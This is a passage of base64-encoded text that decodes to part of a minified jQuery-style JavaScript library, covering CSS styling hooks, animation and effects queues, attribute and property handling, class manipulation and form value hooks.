Q291bnQ6ITAsY29sdW1uQ291bnQ6ITAsZmlsbE9wYWNpdHk6ITAsZmxleEdyb3c6ITAsZmxleFNocmluazohMCxmb250V2VpZ2h0OiEwLGxpbmVIZWlnaHQ6ITAsb3BhY2l0eTohMCxvcmRlcjohMCxvcnBoYW5zOiEwLHdpZG93czohMCx6SW5kZXg6ITAsem9vbTohMH0sY3NzUHJvcHM6eyJmbG9hdCI6ImNzc0Zsb2F0In0sc3R5bGU6ZnVuY3Rpb24oZSx0LG4scil7aWYoZSYmMyE9PWUubm9kZVR5cGUmJjghPT1lLm5vZGVUeXBlJiZlLnN0eWxlKXt2YXIgaSxzLG8sYT1jZS5jYW1lbENhc2UodCksdT1lLnN0eWxlO3JldHVybiB0PWNlLmNzc1Byb3BzW2FdfHwoY2UuY3NzUHJvcHNbYV09UChhKXx8YSksbz1jZS5jc3NIb29rc1t0XXx8Y2UuY3NzSG9va3NbYV0sdm9pZCAwPT09bj9vJiYiZ2V0ImluIG8mJnZvaWQgMCE9PShpPW8uZ2V0KGUsITEscikpP2k6dVt0XToocz10eXBlb2Ygbiwic3RyaW5nIj09PXMmJihpPUZlLmV4ZWMobikpJiZpWzFdJiYobj1mKGUsdCxpKSxzPSJudW1iZXIiKSxudWxsIT1uJiZuPT09biYmKCJudW1iZXIiPT09cyYmKG4rPWkmJmlbM118fChjZS5jc3NOdW1iZXJbYV0/IiI6InB4IikpLGFlLmNsZWFyQ2xvbmVTdHlsZXx8IiIhPT1ufHwwIT09dC5pbmRleE9mKCJiYWNrZ3JvdW5kIil8fCh1W3RdPSJpbmhlcml0IiksbyYmInNldCJpbiBvJiZ2b2lkIDA9PT0obj1vLnNldChlLG4scikpfHwodVt0XT1uKSksdm9pZCAwKX19LGNzczpmdW5jdGlvbihlLHQsbixyKXt2YXIgaSxzLG8sYT1jZS5jYW1lbENhc2UodCk7cmV0dXJuIHQ9Y2UuY3NzUHJvcHNbYV18fChjZS5jc3NQcm9wc1thXT1QKGEpfHxhKSxvPWNlLmNzc0hvb2tzW3RdfHxjZS5jc3NIb29rc1thXSxvJiYiZ2V0ImluIG8mJihpPW8uZ2V0KGUsITAsbikpLHZvaWQgMD09PWkmJihpPWooZSx0LHIpKSwibm9ybWFsIj09PWkmJnQgaW4gc3QmJihpPXN0W3RdKSwiIj09PW58fG4/KHM9cGFyc2VGbG9hdChpKSxuPT09ITB8fGlzRmluaXRlKHMpP3N8fDA6aSk6aX19KSxjZS5lYWNoKFsiaGVpZ2h0Iiwid2lkdGgiXSxmdW5jdGlvbihlLHQpe2NlLmNzc0hvb2tzW3RdPXtnZXQ6ZnVuY3Rpb24oZSxuLHIpe3JldHVybiBuP3J0LnRlc3QoY2UuY3NzKGUsImRpc3BsYXkiKSkmJjA9PT1lLm9mZnNldFdpZHRoP3R0KGUsaXQsZnVuY3Rpb24oKXtyZXR1cm4gQyhlLHQscil9KTpDKGUsdCxyKTp2b2lkIDB9LHNldDpmdW5jdGlvbihlLG4scil7dmFyIGkscz1yJiZldChlKSxvPXImJkYoZSx0LHIsImJvcmRlci1ib3giPT09Y2UuY3NzKGUsImJveFNpemluZyIsITEscykscyk7cmV0dXJuIG8mJihpPUZlLmV4ZWMobikpJiYicHgiIT09KGlbM118fCJweCIpJiYoZS5zdHlsZVt0XT1uLG49Y2UuY3NzKGUsdCkpLEUoZSxuLG8pfX19KSxjZS5jc3NIb29rcy5tYXJnaW5MZWZ0PUgoYWUucmVsaWFibGVNYXJnaW5MZWZ0LGZ1bmN0aW9uKGUsdCl7cmV0dXJuIHQ/KHBhcnNlRmxvYXQoaihlLCJtYXJnaW5MZWZ0IikpfHxlLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpLmxlZnQtdHQoZSx7bWFyZ2luTGVmdDowfSxmdW5jdGlvbigpe3JldHVybiBlLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpLmxlZnR9KSkrInB4Ijp2b2lkIDB9KSxjZS5jc3NIb29rcy5tYXJnaW5SaWdodD1IKGFlLnJlbGlhYmxlTWFyZ2luUmlnaHQsZnVuY3Rpb24oZSx0KXtyZXR1cm4gdD90dChlLHtkaXNwbGF5OiJpbmxpbmUtYmxvY2sifSxqLFtlLCJtYXJnaW5SaWdodCJdKTp2b2lkIDB9KSxjZS5lYWNoKHttYXJnaW46IiIscGFkZGluZzoiIixib3JkZXI6IldpZHRoIn0sZnVuY3Rpb24oZSx0KXtjZS5jc3NIb29rc1tlK3RdPXtleHBhbmQ6ZnVuY3Rpb24obil7Zm9yKHZhciByPTAsaT17fSxzPSJzdHJpbmciPT10eXBlb2Ygbj9uLnNwbGl0KCIgIik6W25dOzQ+cjtyKyspaVtlK0NlW3JdK3RdPXNbcl18fHNbci0yXXx8c1swXTtyZXR1cm4gaX19LEtlLnRlc3QoZSl8fChjZS5jc3NIb29rc1tlK3RdLnNldD1FKX0pLGNlLmZuLmV4dGVuZCh7Y3NzOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIERlKHRoaXMsZnVuY3Rpb24oZSx0LG4pe3ZhciByLGkscz17fSxvPTA7aWYoY2UuaXNBcnJheSh0KSl7Zm9yKHI9ZXQoZSksaT10Lmxlbmd0aDtpPm87bysrKXNbdFtvXV09Y2UuY3NzKGUsdFtvXSwhMSxyKTtyZXR1cm4gc31yZXR1cm4gdm9pZCAwIT09bj9jZS5zdHlsZShlLHQsbik6Y2UuY3NzKGUsdCl9LGUsdCxhcmd1bWVudHMubGVuZ3RoPjEpfSxzaG93OmZ1bmN0aW9uKCl7cmV0dXJuIEEodGhpcywhMCl9LGhpZGU6ZnVuY3Rpb24oKXtyZXR1cm4gQSh0aGlzKX0sdG9nZ2xlOmZ1bmN0aW9uKGUpe3JldHVybiJib29sZWFuIj09dHlwZW9mIGU/ZT90aGlzLnNob3coKTp0aGlzLmhpZGUoKTp0aGlzLmVhY2goZnVuY3Rpb24oKXtBZSh0aGlzKT9jZSh0aGlzKS5zaG93KCk6Y2UodGhpcykuaGlkZSgpfSl9fSksY2UuVHdlZW49TyxPLnByb3RvdHlwZT17Y29uc3RydWN0b3I6Tyxpbml0OmZ1bmN0aW9uKGUsdCxuLHIsaSxzKXt0aGlzLmVsZW09ZSx0aGlzLnByb3A9bix0aGlzLmVhc2luZz1pfHxjZS5lYXNpbmcuX2RlZmF1bHQsdGhpcy5vcHRpb25zPXQsdGhpcy5zdGFydD10aGlzLm5vdz10aGlzLmN1cigpLHRoaXMuZW5kPXIsdGhpcy51bml0PXN8fChjZS5jc3NOdW1iZXJbbl0/IiI6InB4Iil9LGN1cjpmdW5jdGlvbigpe3ZhciBlPU8ucHJvcEhvb2tzW3RoaXMucHJvcF07cmV0dXJuIGUmJmUuZ2V0P2UuZ2V0KHRoaXMpOk8ucHJvcEhvb2tzLl9kZWZhdWx0LmdldCh0aGlzKX0scnVuOmZ1bmN0aW9uKGUpe3ZhciB0LG49Ty5wcm9wSG9va3NbdGhpcy5wcm9wXTtyZXR1cm4gdGhpcy5vcHRpb25zLmR1cmF0aW9uP3RoaXMucG9zPXQ9Y2UuZWFzaW5nW3RoaXMuZWFzaW5nXShlLHRoaXMub3B0aW9ucy5kdXJhdGlvbiplLDAsMSx0aGlzLm9wdGlvbnMuZHVyYXRpb24pOnRoaXMucG9zPXQ9ZSx0aGlzLm5vdz0odGhpcy5lbmQtdGhpcy5zdGFydCkqdCt0aGlzLnN0YXJ0LHRoaXMub3B0aW9ucy5zdGVwJiZ0aGlzLm9wdGlvbnMuc3RlcC5jYWxsKHRoaXMuZWxlbSx0aGlzLm5vdyx0aGlzKSxuJiZuLnNldD9uLnNldCh0aGlzKTpPLnByb3BIb29rcy5fZGVmYXVsdC5zZXQodGhpcyksdGhpc319LE8ucHJvdG90eXBlLmluaXQucHJvdG90eXBlPU8ucHJvdG90eXBlLE8ucHJvcEhvb2tzPXtfZGVmYXVsdDp7Z2V0OmZ1bmN0aW9uKGUpe3ZhciB0O3JldHVybiAxIT09ZS5lbGVtLm5vZGVUeXBlfHxudWxsIT1lLmVsZW1bZS5wcm9wXSYmbnVsbD09ZS5lbGVtLnN0eWxlW2UucHJvcF0/ZS5lbGVtW2UucHJvcF06KHQ9Y2UuY3NzKGUuZWxlbSxlLnByb3AsIiIpLHQmJiJhdXRvIiE9PXQ/dDowKX0sc2V0OmZ1bmN0aW9uKGUpe2NlLmZ4LnN0ZXBbZS5wcm9wXT9jZS5meC5zdGVwW2UucHJvcF0oZSk6MSE9PWUuZWxlbS5ub2RlVHlwZXx8bnVsbD09ZS5lbGVtLnN0eWxlW2NlLmNzc1Byb3BzW2UucHJvcF1dJiYhY2UuY3NzSG9va3NbZS5wcm9wXT9lLmVsZW1bZS5wcm9wXT1lLm5vdzpjZS5zdHlsZShlLmVsZW0sZS5wcm9wLGUubm93K2UudW5pdCl9fX0sTy5wcm9wSG9va3Muc2Nyb2xsVG9wPU8ucHJvcEhvb2tzLnNjcm9sbExlZnQ9e3NldDpmdW5jdGlvbihlKXtlLmVsZW0ubm9kZVR5cGUmJmUuZWxlbS5wYXJlbnROb2RlJiYoZS5lbGVtW2UucHJvcF09ZS5ub3cpfX0sY2UuZWFzaW5nPXtsaW5lYXI6ZnVuY3Rpb24oZSl7cmV0dXJuIGV9LHN3aW5nOmZ1bmN0aW9uKGUpe3JldHVybi41LU1hdGguY29zKGUqTWF0aC5QSSkvMn0sX2RlZmF1bHQ6InN3aW5nIn0sY2UuZng9Ty5wcm90b3R5cGUuaW5pdCxjZS5meC5zdGVwPXt9O3ZhciB1dCxjdCxsdD0vXig/OnRvZ2dsZXxzaG93fGhpZGUpJC8sZHQ9L3F1ZXVlSG9va3MkLztjZS5BbmltYXRpb249Y2UuZXh0ZW5kKHose3R3ZWVuZXJzOnsiKiI6W2Z1bmN0aW9uKGUsdCl7dmFyIG49dGhpcy5jcmVhdGVUd2VlbihlLHQpO3JldHVybiBmKG4uZWxlbSxlLEZlLmV4ZWModCksbiksbn1dfSx0d2VlbmVyOmZ1bmN0aW9uKGUsdCl7Y2UuaXNGdW5jdGlvbihlKT8odD1lLGU9WyIqIl0pOmU9ZS5tYXRjaChUZSk7Zm9yKHZhciBuLHI9MCxpPWUubGVuZ3RoO2k+cjtyKyspbj1lW3JdLHoudHdlZW5lcnNbbl09ei50d2VlbmVyc1tuXXx8W10sei50d2VlbmVyc1tuXS51bnNoaWZ0KHQpfSxwcmVmaWx0ZXJzOltXXSxwcmVmaWx0ZXI6ZnVuY3Rpb24oZSx0KXt0P3oucHJlZmlsdGVycy51bnNoaWZ0KGUpOnoucHJlZmlsdGVycy5wdXNoKGUpfX0pLGNlLnNwZWVkPWZ1bmN0aW9uKGUsdCxuKXt2YXIgcj1lJiYib2JqZWN0Ij09dHlwZW9mIGU/Y2UuZXh0ZW5kKHt9LGUpOntjb21wbGV0ZTpufHwhbiYmdHx8Y2UuaXNGdW5jdGlvbihlKSYmZSxkdXJhdGlvbjplLGVhc2luZzpuJiZ0fHx0JiYhY2UuaXNGdW5jdGlvbih0KSYmdH07cmV0dXJuIHIuZHVyYXRpb249Y2UuZngub2ZmPzA6Im51bWJlciI9PXR5cGVvZiByLmR1cmF0aW9uP3IuZHVyYXRpb246ci5kdXJhdGlvbiBpbiBjZS5meC5zcGVlZHM/Y2UuZnguc3BlZWRzW3IuZHVyYXRpb25dOmNlLmZ4LnNwZWVkcy5fZGVmYXVsdCxudWxsIT1yLnF1ZXVlJiZyLnF1ZXVlIT09ITB8fChyLnF1ZXVlPSJmeCIpLHIub2xkPXIuY29tcGxldGUsci5jb21wbGV0ZT1mdW5jdGlvbigpe2NlLmlzRnVuY3Rpb24oci5vbGQpJiZyLm9sZC5jYWxsKHRoaXMpLHIucXVldWUmJmNlLmRlcXVldWUodGhpcyxyLnF1ZXVlKX0scn0sY2UuZm4uZXh0ZW5kKHtmYWRlVG86ZnVuY3Rpb24oZSx0LG4scil7cmV0dXJuIHRoaXMuZmlsdGVyKEFlKS5jc3MoIm9wYWNpdHkiLDApLnNob3coKS5lbmQoKS5hbmltYXRlKHtvcGFjaXR5OnR9LGUsbixyKX0sYW5pbWF0ZTpmdW5jdGlvbihlLHQsbixyKXt2YXIgaT1jZS5pc0VtcHR5T2JqZWN0KGUpLHM9Y2Uuc3BlZWQodCxuLHIpLG89ZnVuY3Rpb24oKXt2YXIgdD16KHRoaXMsY2UuZXh0ZW5kKHt9LGUpLHMpOyhpfHx4ZS5nZXQodGhpcywiZmluaXNoIikpJiZ0LnN0b3AoITApfTtyZXR1cm4gby5maW5pc2g9byxpfHxzLnF1ZXVlPT09ITE/dGhpcy5lYWNoKG8pOnRoaXMucXVldWUocy5xdWV1ZSxvKX0sc3RvcDpmdW5jdGlvbihlLHQsbil7dmFyIHI9ZnVuY3Rpb24oZSl7dmFyIHQ9ZS5zdG9wO2RlbGV0ZSBlLnN0b3AsdChuKX07cmV0dXJuInN0cmluZyIhPXR5cGVvZiBlJiYobj10LHQ9ZSxlPXZvaWQgMCksdCYmZSE9PSExJiZ0aGlzLnF1ZXVlKGV8fCJmeCIsW10pLHRoaXMuZWFjaChmdW5jdGlvbigpe3ZhciB0PSEwLGk9bnVsbCE9ZSYmZSsicXVldWVIb29rcyIscz1jZS50aW1lcnMsbz14ZS5nZXQodGhpcyk7aWYoaSlvW2ldJiZvW2ldLnN0b3AmJnIob1tpXSk7ZWxzZSBmb3IoaSBpbiBvKW9baV0mJm9baV0uc3RvcCYmZHQudGVzdChpKSYmcihvW2ldKTtmb3IoaT1zLmxlbmd0aDtpLS07KXNbaV0uZWxlbSE9PXRoaXN8fG51bGwhPWUmJnNbaV0ucXVldWUhPT1lfHwoc1tpXS5hbmltLnN0b3AobiksdD0hMSxzLnNwbGljZShpLDEpKTshdCYmbnx8Y2UuZGVxdWV1ZSh0aGlzLGUpfSl9LGZpbmlzaDpmdW5jdGlvbihlKXtyZXR1cm4gZSE9PSExJiYoZT1lfHwiZngiKSx0aGlzLmVhY2goZnVuY3Rpb24oKXt2YXIgdCxuPXhlLmdldCh0aGlzKSxyPW5bZSsicXVldWUiXSxpPW5bZSsicXVldWVIb29rcyJdLHM9Y2UudGltZXJzLG89cj9yLmxlbmd0aDowO2ZvcihuLmZpbmlzaD0hMCxjZS5xdWV1ZSh0aGlzLGUsW10pLGkmJmkuc3RvcCYmaS5zdG9wLmNhbGwodGhpcywhMCksdD1zLmxlbmd0aDt0LS07KXNbdF0uZWxlbT09PXRoaXMmJnNbdF0ucXVldWU9PT1lJiYoc1t0XS5hbmltLnN0b3AoITApLHMuc3BsaWNlKHQsMSkpO2Zvcih0PTA7bz50O3QrKylyW3RdJiZyW3RdLmZpbmlzaCYmclt0XS5maW5pc2guY2FsbCh0aGlzKTtkZWxldGUgbi5maW5pc2h9KX19KSxjZS5lYWNoKFsidG9nZ2xlIiwic2hvdyIsImhpZGUiXSxmdW5jdGlvbihlLHQpe3ZhciBuPWNlLmZuW3RdO2NlLmZuW3RdPWZ1bmN0aW9uKGUscixpKXtyZXR1cm4gbnVsbD09ZXx8ImJvb2xlYW4iPT10eXBlb2YgZT9uLmFwcGx5KHRoaXMsYXJndW1lbnRzKTp0aGlzLmFuaW1hdGUoTih0LCEwKSxlLHIsaSl9fSksY2UuZWFjaCh7c2xpZGVEb3duOk4oInNob3ciKSxzbGlkZVVwOk4oImhpZGUiKSxzbGlkZVRvZ2dsZTpOKCJ0b2dnbGUiKSxmYWRlSW46e29wYWNpdHk6InNob3cifSxmYWRlT3V0OntvcGFjaXR5OiJoaWRlIn0sZmFkZVRvZ2dsZTp7b3BhY2l0eToidG9nZ2xlIn19LGZ1bmN0aW9uKGUsdCl7Y2UuZm5bZV09ZnVuY3Rpb24oZSxuLHIpe3JldHVybiB0aGlzLmFuaW1hdGUodCxlLG4scil9fSksY2UudGltZXJzPVtdLGNlLmZ4LnRpY2s9ZnVuY3Rpb24oKXt2YXIgZSx0PTAsbj1jZS50aW1lcnM7Zm9yKHV0PWNlLm5vdygpO3Q8bi5sZW5ndGg7dCsrKWU9blt0XSxlKCl8fG5bdF0hPT1lfHxuLnNwbGljZSh0LS0sMSk7bi5sZW5ndGh8fGNlLmZ4LnN0b3AoKSx1dD12b2lkIDB9LGNlLmZ4LnRpbWVyPWZ1bmN0aW9uKGUpe2NlLnRpbWVycy5wdXNoKGUpLGUoKT9jZS5meC5zdGFydCgpOmNlLnRpbWVycy5wb3AoKX0sY2UuZnguaW50ZXJ2YWw9MTMsY2UuZnguc3RhcnQ9ZnVuY3Rpb24oKXtjdHx8KGN0PW4uc2V0SW50ZXJ2YWwoY2UuZngudGljayxjZS5meC5pbnRlcnZhbCkpfSxjZS5meC5zdG9wPWZ1bmN0aW9uKCl7bi5jbGVhckludGVydmFsKGN0KSxjdD1udWxsfSxjZS5meC5zcGVlZHM9e3Nsb3c6NjAwLGZhc3Q6MjAwLF9kZWZhdWx0OjQwMH0sY2UuZm4uZGVsYXk9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZT1jZS5meD9jZS5meC5zcGVlZHNbZV18fGU6ZSx0PXR8fCJmeCIsdGhpcy5xdWV1ZSh0LGZ1bmN0aW9uKHQscil7dmFyIGk9bi5zZXRUaW1lb3V0KHQsZSk7ci5zdG9wPWZ1bmN0aW9uKCl7bi5jbGVhclRpbWVvdXQoaSl9fSl9LGZ1bmN0aW9uKCl7dmFyIGU9Wi5jcmVhdGVFbGVtZW50KCJpbnB1dCIpLHQ9Wi5jcmVhdGVFbGVtZW50KCJzZWxlY3QiKSxuPXQuYXBwZW5kQ2hpbGQoWi5jcmVhdGVFbGVtZW50KCJvcHRpb24iKSk7ZS50eXBlPSJjaGVja2JveCIsYWUuY2hlY2tPbj0iIiE9PWUudmFsdWUsYWUub3B0U2VsZWN0ZWQ9bi5zZWxlY3RlZCx0LmRpc2FibGVkPSEwLGFlLm9wdERpc2FibGVkPSFuLmRpc2FibGVkLGU9Wi5jcmVhdGVFbGVtZW50KCJpbnB1dCIpLGUudmFsdWU9InQiLGUudHlwZT0icmFkaW8iLGFlLnJhZGlvVmFsdWU9InQiPT09ZS52YWx1ZX0oKTt2YXIgaHQsZnQ9Y2UuZXhwci5hdHRySGFuZGxlO2NlLmZuLmV4dGVuZCh7YXR0cjpmdW5jdGlvbihlLHQpe3JldHVybiBEZSh0aGlzLGNlLmF0dHIsZSx0LGFyZ3VtZW50cy5sZW5ndGg+MSl9LHJlbW92ZUF0dHI6ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbigpe2NlLnJlbW92ZUF0dHIodGhpcyxlKX0pfX0pLGNlLmV4dGVuZCh7YXR0cjpmdW5jdGlvbihlLHQsbil7dmFyIHIsaSxzPWUubm9kZVR5cGU7aWYoMyE9PXMmJjghPT1zJiYyIT09cylyZXR1cm4idW5kZWZpbmVkIj09dHlwZW9mIGUuZ2V0QXR0cmlidXRlP2NlLnByb3AoZSx0LG4pOigxPT09cyYmY2UuaXNYTUxEb2MoZSl8fCh0PXQudG9Mb3dlckNhc2UoKSxpPWNlLmF0dHJIb29rc1t0XXx8KGNlLmV4cHIubWF0Y2guYm9vbC50ZXN0KHQpP2h0OnZvaWQgMCkpLHZvaWQgMCE9PW4/bnVsbD09PW4/dm9pZCBjZS5yZW1vdmVBdHRyKGUsdCk6aSYmInNldCJpbiBpJiZ2b2lkIDAhPT0ocj1pLnNldChlLG4sdCkpP3I6KGUuc2V0QXR0cmlidXRlKHQsbisiIiksbik6aSYmImdldCJpbiBpJiZudWxsIT09KHI9aS5nZXQoZSx0KSk/cjoocj1jZS5maW5kLmF0dHIoZSx0KSxudWxsPT1yP3ZvaWQgMDpyKSl9LGF0dHJIb29rczp7dHlwZTp7c2V0OmZ1bmN0aW9uKGUsdCl7aWYoIWFlLnJhZGlvVmFsdWUmJiJyYWRpbyI9PT10JiZjZS5ub2RlTmFtZShlLCJpbnB1dCIpKXt2YXIgbj1lLnZhbHVlO3JldHVybiBlLnNldEF0dHJpYnV0ZSgidHlwZSIsdCksbiYmKGUudmFsdWU9biksdH19fX0scmVtb3ZlQXR0cjpmdW5jdGlvbihlLHQpe3ZhciBuLHIsaT0wLHM9dCYmdC5tYXRjaChUZSk7aWYocyYmMT09PWUubm9kZVR5cGUpZm9yKDtuPXNbaSsrXTspcj1jZS5wcm9wRml4W25dfHxuLGNlLmV4cHIubWF0Y2guYm9vbC50ZXN0KG4pJiYoZVtyXT0hMSksZS5yZW1vdmVBdHRyaWJ1dGUobil9fSksaHQ9e3NldDpmdW5jdGlvbihlLHQsbil7cmV0dXJuIHQ9PT0hMT9jZS5yZW1vdmVBdHRyKGUsbik6ZS5zZXRBdHRyaWJ1dGUobixuKSxufX0sY2UuZWFjaChjZS5leHByLm1hdGNoLmJvb2wuc291cmNlLm1hdGNoKC9cdysvZyksZnVuY3Rpb24oZSx0KXt2YXIgbj1mdFt0XXx8Y2UuZmluZC5hdHRyO2Z0W3RdPWZ1bmN0aW9uKGUsdCxyKXt2YXIgaSxzO3JldHVybiByfHwocz1mdFt0XSxmdFt0XT1pLGk9bnVsbCE9bihlLHQscik/dC50b0xvd2VyQ2FzZSgpOm51bGwsZnRbdF09cyksaX19KTt2YXIgcHQ9L14oPzppbnB1dHxzZWxlY3R8dGV4dGFyZWF8YnV0dG9uKSQvaSxfdD0vXig/OmF8YXJlYSkkL2k7Y2UuZm4uZXh0ZW5kKHtwcm9wOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIERlKHRoaXMsY2UucHJvcCxlLHQsYXJndW1lbnRzLmxlbmd0aD4xKX0scmVtb3ZlUHJvcDpmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCl7ZGVsZXRlIHRoaXNbY2UucHJvcEZpeFtlXXx8ZV19KX19KSxjZS5leHRlbmQoe3Byb3A6ZnVuY3Rpb24oZSx0LG4pe3ZhciByLGkscz1lLm5vZGVUeXBlO2lmKDMhPT1zJiY4IT09cyYmMiE9PXMpcmV0dXJuIDE9PT1zJiZjZS5pc1hNTERvYyhlKXx8KHQ9Y2UucHJvcEZpeFt0XXx8dCxpPWNlLnByb3BIb29rc1t0XSksdm9pZCAwIT09bj9pJiYic2V0ImluIGkmJnZvaWQgMCE9PShyPWkuc2V0KGUsbix0KSk/cjplW3RdPW46aSYmImdldCJpbiBpJiZudWxsIT09KHI9aS5nZXQoZSx0KSk/cjplW3RdfSxwcm9wSG9va3M6e3RhYkluZGV4OntnZXQ6ZnVuY3Rpb24oZSl7dmFyIHQ9Y2UuZmluZC5hdHRyKGUsInRhYmluZGV4Iik7cmV0dXJuIHQ/cGFyc2VJbnQodCwxMCk6cHQudGVzdChlLm5vZGVOYW1lKXx8X3QudGVzdChlLm5vZGVOYW1lKSYmZS5ocmVmPzA6LTF9fX0scHJvcEZpeDp7ImZvciI6Imh0bWxGb3IiLCJjbGFzcyI6ImNsYXNzTmFtZSJ9fSksYWUub3B0U2VsZWN0ZWR8fChjZS5wcm9wSG9va3Muc2VsZWN0ZWQ9e2dldDpmdW5jdGlvbihlKXt2YXIgdD1lLnBhcmVudE5vZGU7cmV0dXJuIHQmJnQucGFyZW50Tm9kZSYmdC5wYXJlbnROb2RlLnNlbGVjdGVkSW5kZXgsbnVsbH0sc2V0OmZ1bmN0aW9uKGUpe3ZhciB0PWUucGFyZW50Tm9kZTt0JiYodC5zZWxlY3RlZEluZGV4LHQucGFyZW50Tm9kZSYmdC5wYXJlbnROb2RlLnNlbGVjdGVkSW5kZXgpfX0pLGNlLmVhY2goWyJ0YWJJbmRleCIsInJlYWRPbmx5IiwibWF4TGVuZ3RoIiwiY2VsbFNwYWNpbmciLCJjZWxsUGFkZGluZyIsInJvd1NwYW4iLCJjb2xTcGFuIiwidXNlTWFwIiwiZnJhbWVCb3JkZXIiLCJjb250ZW50RWRpdGFibGUiXSxmdW5jdGlvbigpe2NlLnByb3BGaXhbdGhpcy50b0xvd2VyQ2FzZSgpXT10aGlzfSk7dmFyIG10PS9bXHRcclxuXGZdL2c7Y2UuZm4uZXh0ZW5kKHthZGRDbGFzczpmdW5jdGlvbihlKXt2YXIgdCxuLHIsaSxzLG8sYSx1PTA7aWYoY2UuaXNGdW5jdGlvbihlKSlyZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKHQpe2NlKHRoaXMpLmFkZENsYXNzKGUuY2FsbCh0aGlzLHQscSh0aGlzKSkpfSk7aWYoInN0cmluZyI9PXR5cGVvZiBlJiZlKWZvcih0PWUubWF0Y2goVGUpfHxbXTtuPXRoaXNbdSsrXTspaWYoaT1xKG4pLHI9MT09PW4ubm9kZVR5cGUmJigiICIraSsiICIpLnJlcGxhY2UobXQsIiAiKSl7Zm9yKG89MDtzPXRbbysrXTspci5pbmRleE9mKCIgIitzKyIgIik8MCYmKHIrPXMrIiAiKTthPWNlLnRyaW0ociksaSE9PWEmJm4uc2V0QXR0cmlidXRlKCJjbGFzcyIsYSl9cmV0dXJuIHRoaXN9LHJlbW92ZUNsYXNzOmZ1bmN0aW9uKGUpe3ZhciB0LG4scixpLHMsbyxhLHU9MDtpZihjZS5pc0Z1bmN0aW9uKGUpKXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24odCl7Y2UodGhpcykucmVtb3ZlQ2xhc3MoZS5jYWxsKHRoaXMsdCxxKHRoaXMpKSl9KTtpZighYXJndW1lbnRzLmxlbmd0aClyZXR1cm4gdGhpcy5hdHRyKCJjbGFzcyIsIiIpO2lmKCJzdHJpbmciPT10eXBlb2YgZSYmZSlmb3IodD1lLm1hdGNoKFRlKXx8W107bj10aGlzW3UrK107KWlmKGk9cShuKSxyPTE9PT1uLm5vZGVUeXBlJiYoIiAiK2krIiAiKS5yZXBsYWNlKG10LCIgIikpe2ZvcihvPTA7cz10W28rK107KWZvcig7ci5pbmRleE9mKCIgIitzKyIgIik+LTE7KXI9ci5yZXBsYWNlKCIgIitzKyIgIiwiICIpO2E9Y2UudHJpbShyKSxpIT09YSYmbi5zZXRBdHRyaWJ1dGUoImNsYXNzIixhKX1yZXR1cm4gdGhpc30sdG9nZ2xlQ2xhc3M6ZnVuY3Rpb24oZSx0KXt2YXIgbj10eXBlb2YgZTtyZXR1cm4iYm9vbGVhbiI9PXR5cGVvZiB0JiYic3RyaW5nIj09PW4/dD90aGlzLmFkZENsYXNzKGUpOnRoaXMucmVtb3ZlQ2xhc3MoZSk6Y2UuaXNGdW5jdGlvbihlKT90aGlzLmVhY2goZnVuY3Rpb24obil7Y2UodGhpcykudG9nZ2xlQ2xhc3MoZS5jYWxsKHRoaXMsbixxKHRoaXMpLHQpLHQpfSk6dGhpcy5lYWNoKGZ1bmN0aW9uKCl7dmFyIHQscixpLHM7aWYoInN0cmluZyI9PT1uKWZvcihyPTAsaT1jZSh0aGlzKSxzPWUubWF0Y2goVGUpfHxbXTt0PXNbcisrXTspaS5oYXNDbGFzcyh0KT9pLnJlbW92ZUNsYXNzKHQpOmkuYWRkQ2xhc3ModCk7ZWxzZSB2b2lkIDAhPT1lJiYiYm9vbGVhbiIhPT1ufHwodD1xKHRoaXMpLHQmJnhlLnNldCh0aGlzLCJfX2NsYXNzTmFtZV9fIix0KSx0aGlzLnNldEF0dHJpYnV0ZSYmdGhpcy5zZXRBdHRyaWJ1dGUoImNsYXNzIix0fHxlPT09ITE/IiI6eGUuZ2V0KHRoaXMsIl9fY2xhc3NOYW1lX18iKXx8IiIpKX0pfSxoYXNDbGFzczpmdW5jdGlvbihlKXt2YXIgdCxuLHI9MDtmb3IodD0iICIrZSsiICI7bj10aGlzW3IrK107KWlmKDE9PT1uLm5vZGVUeXBlJiYoIiAiK3EobikrIiAiKS5yZXBsYWNlKG10LCIgIikuaW5kZXhPZih0KT4tMSlyZXR1cm4hMDtyZXR1cm4hMX19KTt2YXIgeXQ9L1xyL2csZ3Q9L1tceDIwXHRcclxuXGZdKy9nO2NlLmZuLmV4dGVuZCh7dmFsOmZ1bmN0aW9uKGUpe3ZhciB0LG4scixpPXRoaXNbMF07e2lmKGFyZ3VtZW50cy5sZW5ndGgpcmV0dXJuIHI9Y2UuaXNGdW5jdGlvbihlKSx0aGlzLmVhY2goZnVuY3Rpb24obil7dmFyIGk7MT09PXRoaXMubm9kZVR5cGUmJihpPXI/ZS5jYWxsKHRoaXMsbixjZSh0aGlzKS52YWwoKSk6ZSxudWxsPT1pP2k9IiI6Im51bWJlciI9PXR5cGVvZiBpP2krPSIiOmNlLmlzQXJyYXkoaSkmJihpPWNlLm1hcChpLGZ1bmN0aW9uKGUpe3JldHVybiBudWxsPT1lPyIiOmUrIiJ9KSksdD1jZS52YWxIb29rc1t0aGlzLnR5cGVdfHxjZS52YWxIb29rc1t0aGlzLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCldLHQmJiJzZXQiaW4gdCYmdm9pZCAwIT09dC5zZXQodGhpcyxpLCJ2YWx1ZSIpfHwodGhpcy52YWx1ZT1pKSl9KTtpZihpKXJldHVybiB0PWNlLnZhbEhvb2tzW2kudHlwZV18fGNlLnZhbEhvb2tzW2kubm9kZU5hbWUudG9Mb3dlckNhc2UoKV0sdCYmImdldCJpbiB0JiZ2b2lkIDAhPT0obj10LmdldChpLCJ2YWx1ZSIpKT9uOihuPWkudmFsdWUsInN0cmluZyI9PXR5cGVvZiBuP24ucmVwbGFjZSh5dCwiIik6bnVsbD09bj8iIjpuKX19fSksY2UuZXh0ZW5kKHt2YWxIb29rczp7b3B0aW9uOntnZXQ6ZnVuY3Rpb24oZSl7dmFyIHQ9Y2UuZmluZC5hdHRyKGUsInZhbHVlIik7cmV0dXJuIG51bGwhPXQ/dDpjZS50cmltKGNlLnRleHQoZSkpLnJlcGxhY2UoZ3QsIiAiKX19LH